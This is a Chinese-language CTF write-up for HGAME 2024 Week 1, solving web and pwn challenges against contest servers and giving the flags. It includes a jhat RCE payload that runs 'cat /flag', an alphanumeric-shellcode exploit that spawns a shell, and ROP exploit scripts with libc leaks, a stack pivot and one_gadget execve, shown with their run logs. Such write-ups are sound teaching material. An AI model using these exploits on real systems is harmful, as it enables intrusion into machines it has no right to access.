---
layout: post
title: "HGAME 2024 Writeup - Mantle - Week 1"
date: 2024-02-29T12:00:00+08:00
lang: zh
tags: topic:ctf writeup hgame-2024
---

原地址为<https://vidar-team.feishu.cn/docx/NV9SdXlQIoBkdIxE2slcTtuFnQg>。

---

* **URL**: <https://hgame.vidar.club/>
* **Username**: csmantle (Individual participation)
* **Start Time**: 2024-01-29 20:00:00
* **End Time**: 2024-02-05 20:00:00
* **Status:** AAK @ 2024-02-01 AM

---

- [Web](#web)
  - [ezHTTP](#ezhttp)
  - [Select Courses](#select-courses)
  - [Bypass it](#bypass-it)
  - [jhat](#jhat)
  - [2048\*16](#204816)
- [Pwn](#pwn)
  - [ezSignIn](#ezsignin)
  - [ezshellcode](#ezshellcode)
  - [Elden Ring I](#elden-ring-i)
  - [Elden Random Challenge](#elden-random-challenge)
  - [ezfmt string](#ezfmt-string)
- [Reverse](#reverse)
  - [ezASM](#ezasm)
  - [ezPYC](#ezpyc)
  - [ezUPX](#ezupx)
  - [ezIDA](#ezida)
- [Crypto](#crypto)
  - [ezRSA](#ezrsa)
  - [ezPRNG](#ezprng)
  - [奇怪的图片](#奇怪的图片)
  - [ezMath](#ezmath)
- [Misc](#misc)
  - [签到](#签到)
  - [SignIn](#signin)
  - [simple\_attack](#simple_attack)
  - [希儿希儿希尔](#希儿希儿希尔)
  - [来自星尘的问候](#来自星尘的问候)

---

## Web

### ezHTTP

> HTTP Protocol Basics

```plain-text
PS D:\Workspace\rev\hgame_2024> curl -v http://139.196.200.143:30264
*   Trying 139.196.200.143:30264...
* Connected to 139.196.200.143 (139.196.200.143) port 30264
> GET / HTTP/1.1
> Host: 139.196.200.143:30264
> User-Agent: curl/8.4.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.11.6
< Date: Mon, 29 Jan 2024 12:09:17 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 536
< Hint: Maybe you can try changing http request headers?
< Connection: close
<
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Challenge">
  <title>ezHTTP</title>
</head>
<body>
    <p>请从vidar.club访问这个页面</p>
</body>
</html>
<style>
  * {
    margin: 0; padding: 0;
    box-sizing: border-box;
  }
  body {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex;
    justify-content: center; align-items: center;
  }
</style>* Closing connection
PS D:\Workspace\rev\hgame_2024> curl -v -H "Referer: vidar.club" http://139.196.200.143:30264
*   Trying 139.196.200.143:30264...
* Connected to 139.196.200.143 (139.196.200.143) port 30264
> GET / HTTP/1.1
> Host: 139.196.200.143:30264
> User-Agent: curl/8.4.0
> Accept: */*
> Referer: vidar.club
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.11.6
< Date: Mon, 29 Jan 2024 12:09:31 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 645
< Connection: close
<
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Challenge">
  <title>ezHTTP</title>
</head>
<body>
    <p>请通过Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0访问此页面</p>
</body>
</html>
<style>
  * {
    margin: 0; padding: 0;
    box-sizing: border-box;
  }
  body {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex;
    justify-content: center; align-items: center;
  }
</style>* Closing connection
PS D:\Workspace\rev\hgame_2024> curl -v -H "Referer: vidar.club" -H "User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" http://139.196.200.143:30264
*   Trying 139.196.200.143:30264...
* Connected to 139.196.200.143 (139.196.200.143) port 30264
> GET / HTTP/1.1
> Host: 139.196.200.143:30264
> Accept: */*
> Referer: vidar.club
> User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.11.6
< Date: Mon, 29 Jan 2024 12:09:46 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 532
< Hint: Not XFF
< Connection: close
<
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Challenge">
  <title>ezHTTP</title>
</head>
<body>
    <p>请从本地访问这个页面</p>
</body>
</html>
<style>
  * {
    margin: 0; padding: 0;
    box-sizing: border-box;
  }
  body {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex;
    justify-content: center; align-items: center;
  }
</style>* Closing connection
PS D:\Workspace\rev\hgame_2024>
```

不是 X-Forwarded-For，那么是 X-Real-IP，虽然这东西很少见，资料也不多。

```plain-text
PS D:\Workspace\rev\hgame_2024> curl -v -H "Referer: vidar.club" -H "User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" -H "X-Real-IP: 127.0.0.1" http://139.196.200.143:30264
*   Trying 139.196.200.143:30264...
* Connected to 139.196.200.143 (139.196.200.143) port 30264
> GET / HTTP/1.1
> Host: 139.196.200.143:30264
> Accept: */*
> Referer: vidar.club
> User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
> X-Real-IP: 127.0.0.1
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.11.6
< Date: Mon, 29 Jan 2024 12:42:54 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 540
< Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc
< Connection: close
<
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Challenge">
  <title>ezHTTP</title>
</head>
<body>
    <p>Ok, the flag has been given to you ^-^</p>
</body>
</html>
<style>
  * {
    margin: 0; padding: 0;
    box-sizing: border-box;
  }
  body {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex;
    justify-content: center; align-items: center;
  }
</style>* Closing connection
PS D:\Workspace\rev\hgame_2024>
```

看上去是 OAuth 的 token，解码得到 flag。

![](./Hz4hbu2GVoG6q0x4lNRcR95Rn7f.png)

`hgame{HTTP_!s_1mP0rT4nt}`

### Select Courses

> Can you help ma5hr00m select the desired courses?

审 api 没看到啥注入点，根据生活经验编写抢课脚本。

```python
import json
from typing import TypedDict

import requests
from pwn import *

class Course(TypedDict):
    description: str
    id: int
    is_full: bool
    location: str
    name: str
    sort: str
    status: bool
    time: str

class CourseStatus(TypedDict):
    message: list[Course]
    status: int

def get_course_status(api: str) -> CourseStatus:
    r = requests.get(api)
    if r.status_code != 200:
        error(f"Failed to get course status: {r.status_code}")
        exit(1)
    return json.loads(r.text)

def select_course(api: str, course_id: int) -> dict:
    r = requests.post(api, json={"id": course_id})
    if r.status_code != 200:
        error(f"Failed to select course: {r.status_code}")
        exit(1)
    return json.loads(r.text)

def trigger_check(api: str) -> dict:
    r = requests.get(api)
    if r.status_code != 200:
        error(f"Failed to trigger check: {r.status_code}")
        exit(1)
    return json.loads(r.text)

COURSE_API = "http://47.100.137.175:30941/api/courses"
CHECK_API = "http://47.100.137.175:30941/api/ok"

if __name__ == "__main__":
    while True:
        status = get_course_status(COURSE_API)
        vacant_ids = map(
            lambda c: c["id"], filter(lambda c: not c["is_full"], status["message"])
        )
        n_selected = len(
            list(
                map(lambda c: c["id"], filter(lambda c: c["status"], status["message"]))
            )
        )
        n_newly_sel = 0
        for course_id in vacant_ids:
            info(f"Selecting course {course_id}")
            select_course(COURSE_API, course_id)
            n_newly_sel += 1
        if n_newly_sel != 0:
            success(f"Selected {n_newly_sel} courses")
        if n_selected == len(status["message"]):
            success("All courses selected")
            break
    check_result = trigger_check(CHECK_API)
    success(check_result)
```

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ python ./Select\ Courses/sol.py
[*] Selecting course 2
[+] Selected 1 courses
[*] Selecting course 2
[+] Selected 1 courses
[*] Selecting course 2
[+] Selected 1 courses
[*] Selecting course 2
[+] Selected 1 courses
...
[*] Selecting course 5
[+] Selected 1 courses
[+] All courses selected
[+] {'message': '谢谢啦！这是给你的礼物：hgame{w0W_!_1E4Rn_To_u5e_5cripT_^_^}'}
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

`hgame{w0W_!_1E4Rn_To_u5e_5cripT_^_^}`

### Bypass it

> This page requires javascript to be enabled :)

我还以为这题要我盲打弱比较呢

点击注册，无法注册。

![](./KlNxbvv7tonX7jxck6TckLRJn6c.png)

直接 curl 一份网页下来。

```plain-text
PS D:\Workspace\rev\hgame_2024> curl -v http://47.100.245.185:31910/register_page.php
*   Trying 47.100.245.185:31910...
* Connected to 47.100.245.185 (47.100.245.185) port 31910
> GET /register_page.php HTTP/1.1
> Host: 47.100.245.185:31910
> User-Agent: curl/8.4.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Tue, 30 Jan 2024 08:48:55 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/7.4.5
<
<html>
<head>
    <meta charset="utf-8">
        <title>用户注册</title>
    <link rel="stylesheet" href="/css/bootstrap.min.css">
    <script src="/js/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container">
        <form action="register.php" method="post">
                <fieldset>
                        <legend>用户注册</legend>
                        <ul>
                                <li>
                                        <label>用户名:</label>
                                        <input type="text" name="username" />
                                </li>
                                <li>
                                        <label>密　码:</label>
                                        <input type="password" name="password" />
                                </li>
                                <li>
                                        <label> </label>
                                        <input type="submit" name="register" value="注册" />
                                </li>
                        </ul>
                </fieldset>
        </form>
<script language='javascript' defer>alert('很抱歉，当前不允许注册');top.location.href='login.html'</script></div>
</body>
</html>
* Connection #0 to host 47.100.245.185 left intact
PS D:\Workspace\rev\hgame_2024>
```

构造一个 form 提交上去。

```plain-text
PS D:\Workspace\rev\hgame_2024> curl -v -X POST -d "username=phpIsManure&password=phpIsManure&register=1" http://47.100.245.185:31910/register.php
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 47.100.245.185:31910...
* Connected to 47.100.245.185 (47.100.245.185) port 31910
> POST /register.php HTTP/1.1
> Host: 47.100.245.185:31910
> User-Agent: curl/8.4.0
> Accept: */*
> Content-Length: 52
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Tue, 30 Jan 2024 08:49:03 GMT
< Content-Type: text/html; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/7.4.5
<
<script language='javascript' defer>alert('注册成功');top.location.href='login.html'</script>* Connection #0 to host 47.100.245.185 left intact
PS D:\Workspace\rev\hgame_2024>
```

登录拿 flag。

![](./GmYZbrbaioInOPxaW3ScSUi1ngc.png)

`hgame{0c3c63a86c53b38e9fe038c6e2e4c7f843c77f0e}`

### jhat

> jhat is a tool used for analyzing Java heap dump files

jhat 中的自定义查询存在 RCE。

```java
(new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cat /flag").getInputStream())).useDelimiter('\\\\A').next()
```

![](./SPYhbmUHkoj9gbx0GFscPPkfnQf.png)

### 2048*16

> 2048 还是太简单了，柏喵喵决定挑战一下 2048*16

JS anti-`debugger` 和 patch。

直接 F12 的话，Firefox 会直接 hang，Chrome 能看到一个相当深的 debugger 递归。

![](./TxuWb2fQ3o29X1xiey9cudn4noe.png)

爬取网页，然后 patch 掉相关 debugger 语句片段。

![](./Z6qObHwaLoxkbcxLU25cUklvnoh.png)

这样的代码有很多处。全部完成后可以使用 F12 调试。

选择将初始生成方块的数字调至接近 32768 的数值，比如 16384。

![](./UIJjbUiziorMS9xCHoxcTTHenZb.png)

看到一个 this.addStartTiles()，动调获取函数体。

![](./ByxHbfnt0okhmJxzJCCcmAXQnFc.png)

然后进一步跟进。修改生成的块上数量为 8192 和 16384。

![](./H1s4bqoyBo0YTuxn3bCcJ5Y8n2f.png)

稍微按两下即可 getflag。

![](./FWbXboxMwoAGSFxHQEHclubGnRh.png)

`flag{b99b820f-934d-44d4-93df-41361df7df2d}`

这里提供 patch 后的网页文件：

## Pwn

### ezSignIn

> Have fun in pwn games of hgame2024~

```bash
PS D:\Workspace\rev\hgame_2024> ncat 47.100.137.175 31774
hgame{I_HATE_PWN}


Ncat: 你的主机中的软件中止了一个已建立的连接。 .
PS D:\Workspace\rev\hgame_2024>
```

`hgame{I_HATE_PWN}`

### ezshellcode

> Short visible shellcode？

64bit shellcode，长度限制 10 字节，范围 A-Za-z0-9

```c
void __fastcall myread(uint8_t *buf, unsigned int len)
{
  char v2; // [rsp+1Fh] [rbp-11h]
  unsigned int i; // [rsp+20h] [rbp-10h]
  unsigned int v4; // [rsp+24h] [rbp-Ch]

  v4 = read(0, buf, len);
  for ( i = 0; i < v4; ++i )
  {
    v2 = buf[i];
    if ( (v2 <= '`' || v2 > 'z') && (v2 <= '@' || v2 > 'Z') && (v2 <= '/' || v2 > '9') )
    {
      puts("Invalid character\n");
      exit(1);
    }
  }
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  signed int len; // [rsp+Ch] [rbp-14h] BYREF
  uint8_t *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  buf = (uint8_t *)(int)mmap((void *)0x20240000, 0x1000uLL, 7, 33, -1, 0LL);
  if ( buf == (uint8_t *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  printf("input the length of your shellcode:");
  __isoc99_scanf("%2d", &len);
  if ( len <= 10 )
  {
    printf("input your shellcode:");
    myread(buf, len);
  }
  else
  {
    puts("too long");
  }
  ((void (*)(void))buf)();
  return 0;
}
```

这个长度限制输入的是 %2d，可以发送-1 使 read 的长度限制开到 INT32_MAX。那么长度限制就寄了。

shellcode 构造使用 AE64。

```python
from pwn import *
from ae64 import AE64

context.binary = ELF("./ezshellcode/attachment/vuln")

shell = asm(shellcraft.amd64.linux.sh())
shell = AE64().encode(shell, "rax", 0, "fast")
info(shell)

with remote("47.100.139.115", 32676) as r:
    r.sendlineafter(b"input the length of your shellcode:", b"-1")
    r.sendafter(b"input your shellcode:", shell)
    r.interactive()
```

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ python ./ezshellcode/sol.py
[*] '/mnt/d/Workspace/rev/hgame_2024/ezshellcode/attachment/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] prologue generated
[+] encoded shellcode generated
[*] build decoder, try free space: 54 ...
[*] build decoder, try free space: 186 ...
[+] Alphanumeric shellcode generate successfully!
[+] Total length: 234
/home/mantlebao/.local/lib/python3.10/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP
[+] Opening connection to 47.100.139.115 on port 32676: Done
[*] Switching to interactive mode
$ whoami
sh: 1: whoami: not found
$ cat /flag
hgame{cd49f6ab6840204b4618cbaa0b0b6051cb128333}
$
[*] Interrupted
[*] Closed connection to 47.100.139.115 port 32676
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

`hgame{cd49f6ab6840204b4618cbaa0b0b6051cb128333}`

### Elden Ring I

> 伊丽莎白学姐沉迷于艾尔登法环无法自拔，你能帮她从梅琳娜那里拿到 flag 吗？
> flag 格式为 hgame{*******}

除了 NX 之外保护全关。

![](./UXF3b7PtPoli9BxlTcmcgT6snTh.png)

没有 execve。

![](./EXvWbRWJuokB42xXJ1xcwzxXnTd.png)

只有一个很小的溢出。

![](./VQUXbIFtUom7xMxv0BJczApWnAc.png)

那么考虑先 leak 再 orw，~~但是有长度限制。~~栈迁移到 bss 可解。

```python
from pwn import *

vuln = ELF("./Elden Ring 1/attachment/vuln")
vuln_libc = ELF("./Elden Ring 1/attachment/libc.so.6")
context.binary = vuln

OFFSET = 0x100
ADDR_POP_RDI_RET = 0x00000000004013E3
ADDR_POP_RSI_R15_RET = 0x00000000004013E1
ADDR_POP_R12_R13_R14_R15_RET = 0x00000000004013DC
ADDR_POP_RDX_RET = 0x0000000000142C92
ADDR_LEAVE_RET = 0x0000000000401290
PUTS_PLT = vuln.plt["puts"]
PUTS_GOT = vuln.got["puts"]
ADDR_BSS = vuln.bss()
ADDR_BSS_START = ADDR_BSS + 0xA0
ADDR_BSS_BUF_FLAG = ADDR_BSS + 0x1A0
ADDR_BSS_BUF_READ = ADDR_BSS_BUF_FLAG + 64

with remote("47.100.137.175", 30511) as r:
    info("Step 1: leak libc base addr")
    payload_1 = (
        cyclic(OFFSET)
        + p64(0xDEADBEEF)
        + p64(ADDR_POP_RDI_RET)
        + p64(PUTS_GOT)
        + p64(PUTS_PLT)
        + p64(vuln.sym["vuln"])
    )
    info(payload_1.hex())
    r.sendafter(
        b"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\n\n",
        payload_1,
    )
    puts_addr = u64(r.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    info(f"puts_addr: {hex(puts_addr)}")
    libc_base = puts_addr - vuln_libc.sym["puts"]
    info(f"libc_base: {hex(libc_base)}")

    info("Step 2: fill data into .bss")
    payload_2 = (
        cyclic(OFFSET)
        + p64(0xDEADBEEF)
        + p64(next(vuln_libc.search(asm("pop rsi; ret"))) + libc_base)
        + p64(ADDR_BSS_START)
        + p64(vuln_libc.sym["read"] + libc_base)
        + p64(vuln.sym["vuln"])
    )
    info(payload_2.hex())
    r.sendafter(
        b"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\n\n",
        payload_2,
    )
    bss_content = b""
    bss_content += (
        p64(ADDR_POP_RSI_R15_RET)
        + p64(ADDR_BSS_BUF_FLAG)
        + p64(0)
        + p64(vuln_libc.sym["read"] + libc_base)
    )
    bss_content += (
        p64(ADDR_POP_RDI_RET)
        + p64(ADDR_BSS_BUF_FLAG)
        + p64(ADDR_POP_RSI_R15_RET)
        + p64(0) * 2
        + p64(vuln_libc.sym["open"] + libc_base)
    )
    bss_content += (
        p64(ADDR_POP_RDI_RET)
        + p64(3)
        + p64(ADDR_POP_RSI_R15_RET)
        + p64(ADDR_BSS_BUF_READ)
        + p64(0)
        + p64(ADDR_POP_RDX_RET + libc_base)
        + p64(0x100)
        + p64(vuln_libc.sym["read"] + libc_base)
    )
    bss_content += (
        p64(ADDR_POP_RDI_RET)
        + p64(ADDR_BSS_BUF_READ)
        + p64(vuln_libc.sym["puts"] + libc_base)
    )
    info(bss_content.hex())
    sleep(1)
    r.send(bss_content)
    sleep(1)

    info("Step 3: migrate stack to .bss")
    payload_3 = cyclic(OFFSET) + p64(ADDR_BSS_START - 8) + p64(ADDR_LEAVE_RET)
    info(payload_3.hex())
    r.sendafter(
        b"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\n\n",
        payload_3,
    )
    sleep(1)
    r.sendline(b"/flag\x00")

    r.interactive()
```

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ python ./Elden\ Ring\ 1/sol.py
[*] '/mnt/d/Workspace/rev/hgame_2024/Elden Ring 1/attachment/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
[*] '/mnt/d/Workspace/rev/hgame_2024/Elden Ring 1/attachment/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 47.100.137.175 on port 30511: Done
[*] Step 1: leak libc base addr
[*] 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a61616262616162636161626461616265616162666161626761616268616162696161626a6161626b6161626c6161626d6161626e6161626f616162706161627161616272616162736161627461616275616162766161627761616278616162796161627a61616362616163636161636461616365616163666161636761616368616163696161636a6161636b6161636c6161636d6161636e616163efbeadde00000000e3134000000000002840400000000000c4104000000000005b12400000000000
[*] puts_addr: 0x7f29f224e420
[*] libc_base: 0x7f29f21ca000
[*] Step 2: fill data into .bss
[*] 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a61616262616162636161626461616265616162666161626761616268616162696161626a6161626b6161626c6161626d6161626e6161626f616162706161627161616272616162736161627461616275616162766161627761616278616162796161627a61616362616163636161636461616365616163666161636761616368616163696161636a6161636b6161636c6161636d6161636e616163efbeadde000000001f001ff2297f00000041400000000000c07f2df2297f00005b12400000000000
[*] e11340000000000000424000000000000000000000000000c07f2df2297f0000e3134000000000000042400000000000e11340000000000000000000000000000000000000000000e07c2df2297f0000e3134000000000000300000000000000e1134000000000004042400000000000000000000000000092cc30f2297f00000001000000000000c07f2df2297f0000e313400000000000404240000000000020e424f2297f0000
[*] Step 3: migrate stack to .bss
[*] 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a61616262616162636161626461616265616162666161626761616268616162696161626a6161626b6161626c6161626d6161626e6161626f616162706161627161616272616162736161627461616275616162766161627761616278616162796161627a61616362616163636161636461616365616163666161636761616368616163696161636a6161636b6161636c6161636d6161636e616163f8404000000000009012400000000000
[*] Switching to interactive mode
flag{D0_yoU_F4ncy_7he_E1d3nR1ng?I_D0!}
          \x1b[3
[*] Got EOF while reading in interactive
$
[*] Closed connection to 47.100.137.175 port 30511
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

注意修改 flag 格式。

`hgame{D0_yoU_F4ncy_7he_E1d3nR1ng?I_D0!}`

### Elden Random Challenge

> rrrrraaaannnnndddddoooommmm

checksec 看到没开 canary 和 PIE：

![](./HWAAbFn6po0yTBx1aEEcREGRnAb.png)

看代码：

```c
void __fastcall myread()
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF

  read(0, buf, 0x100uLL);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i_guess; // [rsp+8h] [rbp-18h] BYREF
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  int rand_x; // [rsp+18h] [rbp-8h]
  unsigned int seed; // [rsp+1Ch] [rbp-4h]

  init(argc, argv, envp);
  seed = time(0LL);
  puts("Menlina: Well tarnished, tell me thy name.");
  read(0, buf, 18uLL);
  printf("I see,%s", buf);
  puts("Now the golden rule asks thee to guess ninety-nine random number. Shall we get started.");
  srand(seed);
  while ( i <= 98 )
  {
    rand_x = rand() % 100 + 1;
    i_guess = 0;
    puts("Please guess the number:");
    read(0, &i_guess, 8uLL);
    if ( rand_x != i_guess )
    {
      puts("wrong!");
      exit(0);
    }
    ++i;
  }
  puts("Here's a reward to thy brilliant mind.");
  myread();
  return 0;
}
```

思路：先覆盖 seed，然后生成 99 个随机数的序列，最后使用 myread 的溢出 getshell。

生成随机数：

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    putchar('[');

    srand(0u);
    for (int i = 0; i < 99; i++) {
        int rand_x = rand() % 100 + 1;
        printf("%d, ", rand_x);
    }

    putchar(']');
    putchar('\n');

    return 0;
}
```

先放 gadget

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ one_gadget ./Elden\ Random\ Challenge/attachment/libc.so.6
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

...

mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ ROPgadget --binary ./Elden\ Random\ Challenge/attachment/vuln
Gadgets information
============================================================
...
0x000000000040141c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
0x0000000000401423 : pop rdi ; ret
...

Unique gadgets found: 79
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

execve 选 0xe3afe，配合 0x40141c 处的四个 pop 一个 ret 使用。

```python
from pwn import *

RANDS = [84, 87, 78, 16, 94, 36, 87, 93, 50, 22, 63, 28, 91, 60, 64, 27, 41, 27, 73, 37, 12, 69, 68, 30, 83, 31, 63, 24, 68, 36, 30, 3, 23, 59, 70, 68, 94, 57, 12, 43, 30, 74, 22, 20, 85, 38, 99, 25, 16, 71, 14, 27, 92, 81, 57, 74, 63, 71, 97, 82, 6, 26, 85, 28, 37, 6, 47, 30, 14, 58, 25, 96, 83, 46, 15, 68, 35, 65, 44, 51, 88, 9, 77, 79, 89, 85, 4, 52, 55, 100, 33, 61, 77, 69, 40, 13, 27, 87, 95]

vuln = ELF("./Elden Random Challenge/attachment/vuln")
vuln_libc = ELF("./Elden Random Challenge/attachment/libc.so.6")
context.binary = vuln

OFFSET = 0x30
ADDR_POP_RDI_RET = 0x0000000000401423
ADDR_POP_R12_R13_R14_R15_RET = 0x000000000040141c
PUTS_PLT = vuln.plt["puts"]
PUTS_GOT = vuln.got["puts"]
ADDR_LIBC_BINSH_GADGET = 0xe3afe

with remote("47.100.137.175", 30766) as r:
    r.sendafter(b"Menlina: Well tarnished, tell me thy name.\n", cyclic(10) + b"\x00" * 8)
    for rand_x in RANDS:
        r.sendlineafter(b"Please guess the number:\n", p32(rand_x, endian="little"))
    info("Random number guessed successfully")

    payload_1 = cyclic(OFFSET) + p64(0xDEADBEEF) + p64(ADDR_POP_RDI_RET) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(vuln.sym["myread"])
    info(payload_1)
    r.sendafter(b"Here's a reward to thy brilliant mind.\n", payload_1)
    puts_addr = u64(r.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    info("puts_addr: " + hex(puts_addr))

    libc_base = puts_addr - vuln_libc.sym["puts"]
    info(f"libc_base: {hex(libc_base)}")

    payload_2 = cyclic(OFFSET) + p64(0xDEADBEEF) + p64(ADDR_POP_R12_R13_R14_R15_RET) + p64(0) * 4 + p64(ADDR_LIBC_BINSH_GADGET + libc_base)
    info(payload_2)
    r.send(payload_2)

    r.interactive()
```

```plain-text
D:\Workspace\pwnenv\Lib\site-packages\pwnlib\log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes   
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaaï¾­Þ#@@@´@]@
[*] puts_addr: 0x7fb18b5a4420
[*] libc_base: 0x7fb18b520000
[*] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaaï¾­Þ
    @þ:`±
[*] Switching to interactive mode
whoami
: 1: whoami: not found
cat /flag
                  .,lcoo:::'''..............            .
    .......     ...::oc,:,;,................
   .........  ....,,c;.;':;,..........'''.....
  ......  .. .....',;.'';;,''....,:c;,,,,'''...
  .....  .......'..,.',';;,,,'.'cdxdddol:,'''.'.                        .
    ..........';'';,.,;;;,;;,;,oxxxxddoolc,'.....                        .
  ...... ....cc;,:;'',;;,,;,,:oxxxxxxddolc:,.....                        .
     .     .::::l:,',;,,,',;cllloddddddlc:;;'....
.      ....',,cco:,,''..';c:;;,,,;lddo:'',,,...                 ..     ...
.      .....'::'::.'....;odoc:;;;:odd:..,;,'.                    .   .....
         ..';:,'........'oxxxxddddxxd,.';clc:'..              ............
.       .,:c::;..;,,'.. .;dxxkkxxxddo'.';clc:,..               .........
     ..,;::,''...,','.....cdxxkkxxooo,.,clc:;..
 . .....''..........'......cdxxxxxxdlc;;:;;,'.
.  .......  ....... ........cdxxdolc:;,';;'..                        .....
     .  ..    ...     ..''..,ldddddollc:;'...  ..
          ..       .'.'':',..cooodddol:'..,......
                   .,'.':c;:'.,:clllc:;,'''.,:..  ..
                   ';:;.':c;:;...,ccc:;'',cc,......
                   .,,:c;';lc:c,...:ccclc;.......'.
                     .',::,';,','..;,,.'.'... ..,.
                      .;;;;;.,':';.;.....;''. ..
                       .::::;,';;,,;,.,,,'....
